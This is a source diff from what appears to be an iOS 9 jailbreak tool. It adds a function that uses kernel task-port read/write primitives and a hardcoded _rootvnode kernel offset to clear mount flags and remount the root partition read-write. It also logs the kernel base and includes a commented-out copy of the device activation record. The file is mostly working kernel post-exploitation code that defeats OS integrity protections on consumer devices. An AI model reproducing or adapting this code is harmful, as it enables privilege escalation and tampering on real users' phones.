@@ -16,7 +16,6 @@
 
 #include "arch.h"
 #include "exploit64.h"
-#include "nvpatch.h"
 #include "load_payload.h"
 
 #include "getshell.h"
@@ -33,23 +32,80 @@
 #include <sys/mount.h>
 #include <sys/utsname.h>
 
+
+#include "kpp.h"
+
+// For '/' remount (not offsets)
+#define OFFSET_ROOT_MOUNT_V_NODE 0xffffff8004536070 // nm kernelcache-decrypt-6s-n71ap-9.3  | grep -E " _rootvnode$"
+
+
+int file_exist (char *filename)
+{
+	struct stat   buffer;
+	return (stat (filename, &buffer) == 0);
+}
+
+
+// remount root partition r/W
+int remount_rw(task_t tfp0) {
+
+	// prepare kernel r/w
+	prepare_rwk_via_tfp0(tfp0);
+	uint64_t rootfs_vnode = ReadAnywhere64(OFFSET_ROOT_MOUNT_V_NODE);
+	
+	struct utsname uts;
+	uname(&uts);
+	
+	vm_offset_t off = 0xd8;
+	if (strstr(uts.version, "16.0.0")) {
+		off = 0xd0;
+	}
+	
+	uint64_t v_mount = ReadAnywhere64(rootfs_vnode+off);
+	
+	uint32_t v_flag = ReadAnywhere32(v_mount + 0x71);
+	
+	WriteAnywhere32(v_mount + 0x71, v_flag & (~(0x1<<6)));
+	
+	char* nmz = strdup("/dev/disk0s1s1");
+	int lolr = mount( "hfs", "/", MNT_UPDATE, (void*)&nmz);
+	NSLog(@"remounting: %d", lolr);
+	
+	v_mount = ReadAnywhere64(rootfs_vnode+off);
+	
+	WriteAnywhere32(v_mount + 0x71, v_flag);
+	
+	int fd = open("/.bit_of_fun", O_RDONLY);
+	if (fd == -1) {
+		fd = creat("/.bit_of_fun", 0644);
+	} else {
+		printf("File already exists!\n");
+	}
+	close(fd);
+	
+	printf("Did we mount / as read+write? %s\n", file_exist("/.bit_of_fun") ? "yes" : "no");
+	
+	//printf("first four values of amficache: %08x\n", rk32(find_amficache()));
+	//printf("trust cache at: %016llx\n", rk64(find_trustcache()));
+	return 0;
+}
+
+
 static int party_hard(void)
 {
-    int ret = 0;
-    if(getuid() != 0) // Skip if we got root already
-    {
-        ret = -1;
-        vm_address_t kbase = 0;
-        task_t kernel_task = get_kernel_task(&kbase);
-        LOG("kernel_task: 0x%x", kernel_task);
-        if(MACH_PORT_VALID(kernel_task))
-        {
-          //  ret = nvpatch(kernel_task, kbase, "com.apple.System.boot-nonce");
-					ret = 0;
-        }
-    }
-    return ret;
+	int ret = 0;
+	if(getuid() != 0) // Skip if we got root already
+	{
+		ret = -1;
+		vm_address_t kbase = 0;
+		task_t kernel_task = get_kernel_task(&kbase);
+		LOG("kernel_task: 0x%x", kernel_task);
+		printf("kernel base:  0x%lx\n",kbase);
+		//remount_rw(kernel_task);
+	 }
+	return ret;
 }
+
 
 bool load_payload(void){
 
@@ -107,21 +163,26 @@ bool load_payload(void){
 		untar(a, "bootstrap");
 		fclose(a);
 		
-		/* kpp pass and got root system partition r/w */  // do not got patch offsets for iOS9 ,just commit ir
+		/* kpp pass and got root system partition r/w */  // do not got patch offsets for iOS9 ,just commit it
 	//	int kpp_init(uint64_t kernbase, uint64_t slide);
 		
 		// getshell
 		
 	//	getshell();
+		
+		//backup activation file
+		//copyfile("/var/containers/Data/System/49A66B5C-C909-4BEF-9475-2BDEC887307D/Library/activation_records/activation_record.plist", "/var/mobile/Media/activate", 0, COPYFILE_ALL);
+	
+		
 	
 		// test
-		FILE *file = fopen("/var/root/.profile", "rb");
+	/*	FILE *file = fopen("/var/root/.profile", "rb");
 		if (file) {
 			char str[1024];
 			while (fscanf(file, "%s", str)!=EOF)
 				printf("%s",str);
 			fclose(file);
-		}
+		}*/
 		
 
 		
